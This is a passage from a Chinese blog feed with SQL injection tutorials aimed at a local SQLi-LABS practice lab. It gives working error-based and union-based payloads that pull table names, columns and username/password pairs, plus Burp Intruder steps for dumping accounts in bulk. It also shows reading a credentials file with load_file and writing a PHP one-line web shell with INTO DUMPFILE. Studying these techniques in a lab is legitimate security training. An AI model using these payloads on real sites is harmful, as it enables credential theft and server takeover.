href="https://www.cnblogs.com/xishaonian/p/6227405.html">https://www.cnblogs.com/xishaonian/p/6227405.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));</span><br></pre></td></tr></table></figure><blockquote><p>函数简介：</p><p>group by 对rand()函数进行操作时产生错误</p><p>concat:连接字符串，在concat后插入sql语句</p><p>floor:取float的整数值</p><p>rand:取0~1之间随机浮点值</p><p>group by:根据一个或多个列对结果集进行分组并有排序功能</p></blockquote><p>我们现在数据库中运行一下这个语句</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714173136368.png" alt="image-20200714173136368"></p><p>我们可以看到在报错的信息中，包含了版本信息5.5.5.31</p><p>我们在网页中试试</p><h3 id="floor爆表名"><a href="#floor爆表名" class="headerlink" title="floor爆表名"></a>floor爆表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e,floor(rand(0)*2)))-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200715173339435.png" alt="image-20200715173339435"></p><h3 id="floor爆列名"><a href="#floor爆列名" class="headerlink" title="floor爆列名"></a>floor爆列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),0x7e,floor(rand(0)*2)))-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717215554928.png" alt="image-20200717215554928"></p><h3 id="floor爆数据"><a href="#floor爆数据" class="headerlink" title="floor爆数据"></a>floor爆数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717215859422.png" alt="image-20200717215859422"></p><h3 id="使用burpsuit批量获取账号密码"><a href="#使用burpsuit批量获取账号密码" class="headerlink" title="使用burpsuit批量获取账号密码"></a>使用burpsuit批量获取账号密码</h3><p>0.构造语句进行第一次发包</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717220735071.png" alt="image-20200717220735071"></p><p>1.对数据进行抓包</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717220603045.png" alt="image-20200717220603045"></p><p>2.在Repeater中重放，我们能看到结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717220759039.png" alt="image-20200717220759039"></p><p>3.再把文件放入Intruder，URL大部分内容时不变的，除了limit</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717221023171.png" alt="image-20200717221023171"></p><p>4.设置爆破点，将limit 0,1中的序号作为爆破点</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717221148048.png" alt="image-20200717221148048"></p><p>5.来到Payload，使用简单清单</p><p>原本计划使用numbers进行爆破，但遇到了不知道为啥有效payload始终出不来的情况，就切换了2020.7版本</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719103746405.png" alt="image-20200719103746405"></p><p>6.匹配输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717221741846.png" alt="image-20200717221741846"></p><p>7.执行</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200717221846881.png" alt="image-20200717221846881"></p><p>8.输出结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719103656928.png" alt="image-20200719103656928"></p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure><p>XPATH语法错误产生报错，我们先到数据库看看效果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719104722903.png" alt="image-20200719104722903"></p><p>extractvalue对XML文档进行查询的函数，其实就是相当于我们熟悉的HTML文件中用 <code>&lt;div&gt;&lt;p&gt;&lt;a&gt;</code>标签查找元素一样</p><p>语法：extractvalue(目标xml文档，xml路径)</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>而我们这里用到了concat，是因为第二个参数有截断的能力，以上文为例，会把root当作是合法字符到了@才发现是不合法的，所以返回结果就会</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719110247864.png" alt="image-20200719110247864"></p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>测表名、列名以及burp爆破都是相同的，重复过程就不再详述</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719113359993.png" alt="image-20200719113359993"></p><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p>XPATH语法错误产生报错</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719113654629.png" alt="image-20200719113654629"></p><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。语法updatexml(目标xml文档，xml路径，更新的内容)</p><p>同样第二个参数 xml中的位置是可操作的地方，concat使用理由与extractvalue相同</p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>测表名、列名以及burp爆破都是相同的，重复过程就不再详述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 4,1),0x7e),1)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719114513130.png" alt="image-20200719114513130"></p><h2 id="数据截取"><a href="#数据截取" class="headerlink" title="数据截取"></a>数据截取</h2><p>对于报错注入而言，其实是有返回字符长度的限制的，通常是限制32位长度，如果过长无法显示，可以使用<code>substr()</code>进行截取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),3,4) from users limit 0,1),0x7e),1)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200719143044932.png" alt="image-20200719143044932"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.Mysql手工注入方法</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/3.Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/3.Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>上文我们讲到了如何找到注入点，以及一些简单工具的使用，但为了深入理解sql注入的原理、在一些场景能够灵活的进行测试，这一次，我们对手工注入进行简单了解</p><a id="more"></a><hr><h1 id="Mysql数据库结构"><a href="#Mysql数据库结构" class="headerlink" title="Mysql数据库结构"></a>Mysql数据库结构</h1><h2 id="Mysql数据库基础结构"><a href="#Mysql数据库基础结构" class="headerlink" title="Mysql数据库基础结构"></a>Mysql数据库基础结构</h2><p>主要分为连接层、SQL层、存储引擎层</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200709175355793.png" alt="image-20200709175355793"></p><h3 id="连接层"><a href="#连接层" class="headerlink" title="连接层"></a>连接层</h3><p>定义了数据库库如何与外部程序进行通信，并控制连接数量，验证用户输入</p><p>内容：通信协议、线程、验证</p><h3 id="SQL层"><a href="#SQL层" class="headerlink" title="SQL层"></a>SQL层</h3><p>对于我们而言，重点关注的就是SQL层</p><p>SQL层通过特地给的语法，完成特定任务的执行，将执行的结果进行处理，返回称为人们可以识别的信息</p><p>内容：解析器、查询执行、授权、查询高速缓存、优化器、查询日志信息</p><p>功能：</p><p>1.判断语法、语句、语义</p><p>2.数据库对象授权情况判断，授权失败不继续</p><p>3.解析器：将SQL语句解析成执行计划，运行执行计划，生成找数据的方式</p><p>4.优化器：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”</p><p>5.执行器：运行执行计划，最终生产如何去磁盘找数据方式 </p><p>6.将去数据的方式，交给下层(存储引擎层完成)</p><p>7.最终将取出的数据抽象成管理员或用户能看懂的方式(表)，展示在用户面前</p><p>8.查询缓存:缓存之前查询的数据</p><h3 id="存储引擎层"><a href="#存储引擎层" class="headerlink" title="存储引擎层"></a>存储引擎层</h3><p> 存储引擎层功能主要是实现数据的存取，也定义了数据存取的格式和方式</p><h2 id="Mysql的内置库"><a href="#Mysql的内置库" class="headerlink" title="Mysql的内置库"></a>Mysql的内置库</h2><p>在mysql(版本&gt;=5.7)中内置了一些功能非常强大的库</p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>保存有账户信息、权限信息、存储过程、event、时区等信息</p><h3 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h3><p>包含了一系列的存储过程、自定义函数以及视窗来帮助我们快速了解系统的元数据信息(元数据是关于数据的数据，如数据库名或者表名，列的数据类型，或访问权限)</p><h3 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h3><p>用于收集数据库服务器性能参数</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>它提供了访问数据库元数据的方式</p><p>其中保存着关于Mysql服务器所维护的所有其他数据库的信息。如数据库名、数据库表、表的数据类型与访问权限等</p><p>information_schema库，功能强大，是进行Mysql注入的基石、可以通过它窥透整个mysql数据库的运行情况和所有的数据信息</p><table><thead><tr><th>功能名称</th><th>查询语句</th></tr></thead><tbody><tr><td>查库</td><td>select schema_name from information_schema.schemata;</td></tr><tr><td>查表</td><td>select table_name from information_schema.tables where table_schema=’库名’;</td></tr><tr><td>查列</td><td>select column_name from information_schema.columns where table_name=’表名’;</td></tr><tr><td>查数据</td><td>select 列名 from 库名.表名;</td></tr></tbody></table><blockquote><p>提示：要查询的目标可以使用十六进制进行代替(users字符串转十六进制结果7573657273)</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711162213303.png" alt="image-20200711162213303"></p></blockquote><h3 id="手工注入方法提示"><a href="#手工注入方法提示" class="headerlink" title="手工注入方法提示"></a>手工注入方法提示</h3><ul><li><p>所有类型的SQL注入，都是基于查库、表、列语句</p></li><li><p>如果数据太多，导致无法返回结果</p><ul><li><p>查询场景：可利用limit(序号,个数)限定返回的数量及位置，依次查询</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711165855074.png" alt="image-20200711165855074"></p></li><li><p>回显数据场景：<code>*concat*</code>链接多个数据称为一条返回结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200711170237737.png" alt="image-20200711170237737"></p></li></ul></li><li><p>在一些场景，想要快速获取数据，可借助工具：burpsuite</p></li></ul><hr><h1 id="手工基础注入流程"><a href="#手工基础注入流程" class="headerlink" title="手工基础注入流程"></a>手工基础注入流程</h1><h2 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>闭合引号，语法报错</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712100820104.png" alt="image-20200712100820104"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>正常显示</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712101541864.png" alt="image-20200712101541864"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br></pre></td></tr></table></figure><p>不显示内容</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712101618709.png" alt="image-20200712101618709"></p><p>我们基本可以认定这里存在SQL注入漏洞</p><h2 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 -- #</span><br></pre></td></tr></table></figure><p>使用order by排序来猜数据表有多少列，如果order by大于列数，则会报错</p><p>这里3返回正常，4返回如下，说明有3列</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712104532067.png" alt="image-20200712104532067"></p><h2 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h2><p>因为html页面只打印一行的输出，我们要让id不显示结果，所以id要是实际不存在的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105303422.png" alt="image-20200712105303422"></p><p>输出打印了2,3，因为1是id所以不显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select schema_name from information_schema.schemata)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105607457.png" alt="image-20200712105607457"></p><p>程序返回数据太多</p><p>有两种方法</p><ul><li><p>使用limit限制输出一条一条查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712105804249.png" alt="image-20200712105804249"></p></li><li><p>使用group_concat把输出结果编程一条语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712110132306.png" alt="image-20200712110132306"></p></li></ul><h2 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h2><p>查询数据表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;)-- #</span><br><span class="line">&#x2F;&#x2F;database()指的是当前库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())-- #</span><br><span class="line">&#x2F;&#x2F;使用十六进制</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712110927951.png" alt="image-20200712110927951"></p><h2 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a>查询列</h2><p>查询列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)-- #</span><br><span class="line">&#x2F;&#x2F;使用十六进制</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200712114656323.png" alt="image-20200712114656323"></p><h2 id="查询表内容"><a href="#查询表内容" class="headerlink" title="查询表内容"></a>查询表内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select concat_ws(&#39;~&#39;,username,password) from security.users limit 0,1)-- #</span><br></pre></td></tr></table></figure><p>表单内容不止一行，所以会导致显示不出来的报错</p><p>原本计划使用group_concat的，但会导致username和password连到一块儿不好分辨</p><p>于是乎就使用concat_ws中间插入~符号进行username和password的分割，但情况又出现了concat_ws分割后还是多条数据，只能使用limit进行一行一行的查看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714002807954.png" alt="image-20200714002807954"></p><p>还有一种强行使用group_concat的方式，把分隔符加载username和password中间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select group_concat(username,&#39;~&#39;,password) from security.users limit 0,1)-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714003023733.png" alt="image-20200714003023733"></p><h2 id="其他的信息搜集"><a href="#其他的信息搜集" class="headerlink" title="其他的信息搜集"></a>其他的信息搜集</h2><p>在数据库中也可以查询一些其他的东西，例如user() databases()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select user())-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714003724521.png" alt="image-20200714003724521"></p><p>具体的将表给整理了一下常用的函数</p><h3 id="注入相关函数概述"><a href="#注入相关函数概述" class="headerlink" title="注入相关函数概述"></a>注入相关函数概述</h3><table><thead><tr><th align="center">函数名称</th><th align="center">函数功能</th><th align="left">函数用法</th></tr></thead><tbody><tr><td align="center">system_user()</td><td align="center">系统用户名</td><td align="left">select system_user();</td></tr><tr><td align="center">user()</td><td align="center">用户名</td><td align="left">select user();</td></tr><tr><td align="center">current_user()</td><td align="center">当前用户名</td><td align="left">select current_user();</td></tr><tr><td align="center">session_user()</td><td align="center">连接数据库的用户名</td><td align="left">select session_user();</td></tr><tr><td align="center">database()</td><td align="center">数据库名</td><td align="left">查看当前数据库：select database();                                                                                    查看所有数据库：show databases;</td></tr><tr><td align="center">version()</td><td align="center">数据库版本</td><td align="left">select version();                                                                                                                                                                      select @@version();</td></tr><tr><td align="center">@@datadir</td><td align="center">数据库路径</td><td align="left">select @@datadir;</td></tr><tr><td align="center">@@basedir</td><td align="center">数据库安装路径</td><td align="left">select @@basedir;</td></tr><tr><td align="center">@@version_compile_os</td><td align="center">操作系统</td><td align="left">select @@version_compile_os;</td></tr><tr><td align="center">count()</td><td align="center">返回执行结果(条/行)数量</td><td align="left">查看users表中有多少条数据：select count(*) from users;</td></tr><tr><td align="center">concat()</td><td align="center">没有分隔符地连接字符串</td><td align="left">select concat(1,2);  连接1，2输出结果12</td></tr><tr><td align="center">concat_ws()</td><td align="center">含有分隔符的链接字符串</td><td align="left">select concat_ws(“:”,username,password) from users;  使用:作为连接符连接输出users表中的username和password列内容</td></tr><tr><td align="center">group_concat()</td><td align="center">连接一个组所有字符串，并以逗号分隔在一行内输出每一条数据</td><td align="left"><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200705105655813.png" alt="image-20200705105655813">select group_concat(username) from users;</td></tr><tr><td align="center">load_file()</td><td align="center">读取本地文件</td><td align="left">select load_file(‘/demo’);</td></tr><tr><td align="center">into outfile</td><td align="center">写文件</td><td align="left">select ‘mysql’ into outfile ‘/demo’;                                                                                                                这里放于磁盘根目录/demo()</td></tr><tr><td align="center">ascii()</td><td align="center">字符串的ASCII代码值</td><td align="left">select ascii(‘a’);</td></tr><tr><td align="center">ord()</td><td align="center">返回字符串第一个字符的ASCII代码值</td><td align="left">select ord(‘abc’); 这里只返回a的</td></tr><tr><td align="center">mid()</td><td align="center">返回一个字符串的一部分 mid(字符串内容，起始位置，长度)</td><td align="left">select mid(‘helloworld’,6,5); 和其他编程语言不同起始位置就是1，这里输出结果为world</td></tr><tr><td align="center">substr()</td><td align="center">返回一个字符串的一部分</td><td align="left">select substr(‘helloworld’,6,5);</td></tr><tr><td align="center">length()</td><td align="center">返回字符串的长度</td><td align="left">select length(‘hello’);</td></tr><tr><td align="center">left()</td><td align="center">返回字符串的最左面几个字符</td><td align="left">select left(‘kinght’,4);</td></tr><tr><td align="center">floor()</td><td align="center">返回小于或等于x的最大整数</td><td align="left">select floor(3.14); 返回3，这里直接采取摸出小数点后方式</td></tr><tr><td align="center">rand()</td><td align="center">返回0和1之前的一个随机数</td><td align="left">select rand();</td></tr><tr><td align="center">sleep()</td><td align="center">让此语句运行N秒钟</td><td align="left">select sleep(2);</td></tr><tr><td align="center">if()</td><td align="center">if(a,b,c) a为表达式，a为真返回b否则返回c</td><td align="left">select if(1&gt;2,2,3)；</td></tr><tr><td align="center">char()</td><td align="center">返回整数ASCII代码字符组成的字符串</td><td align="left">select char(97);</td></tr><tr><td align="center">STRCMP()</td><td align="center">比较字符串内容(其实就是比大小)</td><td align="left">select STRCMP(‘a’,’b’);   a&gt;b=&gt;1   a=b=&gt;0  a&lt;b=&gt;-1</td></tr><tr><td align="center">IFNULL()</td><td align="center">假如参数1不为NULL，则返回参数1，否则其返回值位参数2</td><td align="left">select ifnull(NULL,2);</td></tr><tr><td align="center">exp()</td><td align="center">返回e的自然对数</td><td align="left">select exp(1);</td></tr><tr><td align="center">extractvalue()</td><td align="center">第一个参数：xml document是String格式，为XML文档对象的名称，文中为DOC                 第二个参数：XPath string(Xpath格式的字符串) 作用：从目标XML中返回包含所查询值的字符串</td><td align="left"></td></tr><tr><td align="center">updatexml()</td><td align="center">第一个参数：xml document是String格式，为XML文档对象的名称，文中为DOC 第二个参数：XPath string(Xpath格式的字符串)                                                     第三个参数：new value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点值</td><td align="left"></td></tr></tbody></table><blockquote><p>extractvalue()和updatexml()是运用在xml里面的</p><p>文档：</p><p>xml:<a href="https://www.w3school.com.cn/x.asp">https://www.w3school.com.cn/x.asp</a></p><p>xpath：<a href="https://www.w3school.com.cn/xpath/index.asp">https://www.w3school.com.cn/xpath/index.asp</a></p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>手工注入的最后一步就是提权了</p><p>执行系统命令的方式提权对于mysql是不行的，我们使用的还是读写文件的方式完成提权</p><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>我们直接读取SQLi-LABS配置文件试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,(select load_file(&#39;&#x2F;ide&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;sql-connections&#x2F;db-creds.inc&#39;))-- #</span><br></pre></td></tr></table></figure><p>发现页面没有改变，不过查看页面源代码，发现已经读取成功了，因为有PHP所以不显示</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714010535076.png" alt="image-20200714010535076"></p><p>我们也可以读去系统文件，例如linux的/etc/password如果权限足够也能读取</p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>除去读文件，我们也可以写文件</p><p>我们写一个一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select null,null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;a.php&quot;-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200714012121510.png" alt="image-20200714012121510"></p><p>写入成功，<code>null,null</code>是为了占位置，毕竟id查询结果是三列嘛(然后现在有个问题，为什么这个会写到MySQL\data\security文件夹里去)</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.Python介绍</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/1.%E5%88%9D%E8%AF%86Python/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/1.%E5%88%9D%E8%AF%86Python/</url>
      
